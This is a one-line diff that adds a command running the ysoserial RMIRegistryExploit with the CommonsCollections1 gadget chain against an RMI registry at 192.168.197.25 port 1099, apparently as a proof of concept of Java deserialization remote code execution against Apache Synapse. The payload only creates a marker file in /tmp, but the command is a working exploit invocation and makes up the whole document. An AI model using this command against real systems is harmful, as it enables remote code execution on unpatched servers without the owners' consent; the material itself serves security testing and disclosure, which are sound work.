@@ -1,0 +1,1 @@
+java -cp ysoserial-0.0.5-ALL.jar ysoserial.exploit.RMIRegistryExploit 192.168.197.25 1099 CommonsCollections1  "touch /tmp/apache_synapse"
